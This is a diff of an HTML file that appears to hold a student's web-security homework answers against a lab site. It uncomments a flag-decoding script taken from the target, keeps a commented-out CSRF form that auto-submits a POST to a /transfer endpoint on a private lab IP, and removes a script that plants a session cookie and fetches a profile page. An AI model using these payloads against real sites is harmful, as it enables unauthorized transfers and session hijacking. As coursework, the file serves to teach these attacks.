@@ -1,6 +1,6 @@
 <!-- HW1Q3 ------------------------------------------------------------------------>
-<!-- script taken from app.js of the original BadCSP website -->
-<!-- <script>
+<!-- script in lines 3-18 taken from app.js of the original BadCSP website -->
+<script>
     f = [36, 33, 45, 39, 45, 110, 116, 121, 121, 74, 108, 37, 96, 103, 
     74, 119, 84, 102, 38, 74, 96, 103, 124, 74, 116, 103, 38, 74, 119, 
     112, 89, 37, 123, 114, 74, 97, 37, 74, 96, 32, 104]
@@ -16,15 +16,18 @@
         document.getElementById('flag').innerText = p;
         o(a);
     }
-</script> -->
+</script>
 
 <!-- displays the flag when the page loads -->
-<!-- <body onload="window.alert()">
+<!-- reference for onload on line 23: https://www.w3schools.com/jsref/event_onload.asp -->
+<body onload="window.alert()">
     <h1 id="flag" style="text-align:center;"></h1>
-</body> -->
+</body>
 
 <!-- HW1Q4 ------------------------------------------------------------------------>
-<!-- reference on creating a CSRF attack via POST: https://owasp.org/www-community/attacks/csrf -->
+<!-- reference on creating a CSRF attack via POST: 
+    https://owasp.org/www-community/attacks/csrf 
+    https://learn.snyk.io/lessons/csrf-attack/javascript/ -->
 <!-- <body onload="document.forms[0].submit()">
 
     <form action="http://192.168.2.98:49698/transfer" method="POST">
@@ -33,10 +36,4 @@
         <input type="submit" value="transfer"/>
     </form>
 </body> -->
-
-<!-- HW1Q5 ------------------------------------------------------------------------>
-<script>
-document.cookie = "connect.sid=s%3AZi8QLkX1q8HzlbAIqnkMreBx-suzt_zf.rocbDPrV5CCQ%2BDUj1%2Fg652aASTGUWbqVpjzZ6fdEXy4"
-fetch('http://192.168.2.98:65352/profile')
-</script>
 
